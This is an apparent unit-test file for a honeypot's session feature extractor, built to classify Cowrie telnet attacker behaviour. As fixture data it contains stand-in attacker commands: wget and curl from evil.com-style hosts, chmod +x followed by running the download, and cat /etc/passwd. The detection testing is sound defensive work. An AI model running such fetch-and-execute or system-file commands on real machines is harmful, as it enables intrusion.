"""Unit tests for feature extraction. No live MongoDB needed."""

import sys
from pathlib import Path
from unittest.mock import MagicMock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from honeypot_ml.features.extract import (
    SessionFeatures,
    extract_features,
    _shannon_entropy,
    _unique_ratio,
    _count_downloads,
    _executed_after_download,
    _benign_ratio,
    _duration,
)


def make_session(sid="abc123", start="2026-07-24T05:46:00Z", end="2026-07-24T05:47:00Z"):
    return {
        "_id": "fakeid",
        "session": sid,
        "src_ip": "10.0.2.15",
        "protocol": "telnet",
        "eventid": "cowrie.session.connect",
        "starttime": start,
        "endtime": end,
    }

def make_input_col(commands: list[tuple[str, str]]):
    docs = [
        {"eventid": eid, "input": cmd, "time": i}
        for i, (eid, cmd) in enumerate(commands)
    ]
    mock = MagicMock()
    mock.find.return_value.sort.return_value = docs
    return mock

def make_auth_col(failed: int = 0):
    docs = [{"eventid": "cowrie.login.failed"} for _ in range(failed)]
    mock = MagicMock()
    mock.find.return_value = docs
    return mock


# duration tests
def test_duration_normal():
    assert _duration(make_session()) == 60.0

def test_duration_missing():
    doc = make_session()
    doc.pop("endtime")
    assert _duration(doc) == 0.0

def test_duration_never_negative():
    doc = make_session(start="2026-07-24T05:47:00Z", end="2026-07-24T05:46:00Z")
    assert _duration(doc) == 0.0


# entropy tests
def test_entropy_empty():
    assert _shannon_entropy([]) == 0.0

def test_entropy_single_char():
    assert _shannon_entropy(["aaaa"]) == 0.0

def test_entropy_increases_with_variety():
    low  = _shannon_entropy(["ls", "ls", "ls"])
    high = _shannon_entropy(["wget http://evil.sh", "chmod +x evil.sh", "./evil.sh"])
    assert high > low


# unique ratio tests
def test_unique_ratio_all_same():
    assert _unique_ratio(["ls", "ls", "ls"]) == round(1/3, 4)

def test_unique_ratio_all_different():
    assert _unique_ratio(["ls", "pwd", "whoami"]) == 1.0

def test_unique_ratio_empty():
    assert _unique_ratio([]) == 0.0


# download tests
def test_no_downloads():
    assert _count_downloads(["ls", "whoami"]) == 0

def test_wget_detected():
    assert _count_downloads(["wget http://evil.com/x.sh"]) == 1

def test_multiple_downloads():
    assert _count_downloads(["wget http://a.com/a", "curl http://b.com/b"]) == 2

def test_download_case_insensitive():
    assert _count_downloads(["WGET http://evil.com/x"]) == 1


# execute after download tests
def test_exec_after_download_true():
    assert _executed_after_download(
        ["wget http://evil.com/x.sh", "chmod +x x.sh", "./x.sh"]
    ) is True

def test_exec_no_download():
    assert _executed_after_download(["ls", "chmod +x something"]) is False

def test_exec_before_download():
    assert _executed_after_download(["./existing.sh", "wget http://evil.com/x.sh"]) is False

def test_exec_download_no_exec():
    assert _executed_after_download(["wget http://evil.com/x.sh", "ls"]) is False


# benign ratio tests
def test_all_benign():
    assert _benign_ratio(["ls", "pwd", "whoami"]) == 1.0

def test_no_benign():
    assert _benign_ratio(["wget http://evil.sh", "./evil.sh"]) == 0.0

def test_mixed_benign():
    assert _benign_ratio(["ls", "wget http://evil.sh"]) == 0.5


# full extract_features tests
def test_extract_basic():
    f = extract_features(
        make_session(),
        make_input_col([
            ("cowrie.command.input", "ls"),
            ("cowrie.command.input", "wget http://evil.com/x.sh"),
            ("cowrie.command.input", "chmod +x x.sh"),
            ("cowrie.command.input", "./x.sh"),
            ("cowrie.command.failed", "unknowntool"),
        ]),
        make_auth_col(failed=2)
    )
    assert isinstance(f, SessionFeatures)
    assert f.session_id == "abc123"
    assert f.duration_seconds == 60.0
    assert f.command_count == 4
    assert f.failed_command_count == 1
    assert f.failed_login_count == 2
    assert f.download_attempt_count == 1
    assert f.executed_after_download is True
    assert len(f.commands) == 5

def test_extract_empty_session():
    f = extract_features(
        make_session(),
        make_input_col([]),
        make_auth_col(failed=0)
    )
    assert f.command_count == 0
    assert f.download_attempt_count == 0
    assert f.executed_after_download is False
    assert f.commands == []

def test_extract_no_downloads():
    f = extract_features(
        make_session(),
        make_input_col([
            ("cowrie.command.input", "ls"),
            ("cowrie.command.input", "cat /etc/passwd"),
            ("cowrie.command.input", "whoami"),
        ]),
        make_auth_col(failed=1)
    )
    assert f.download_attempt_count == 0
    assert f.executed_after_download is False

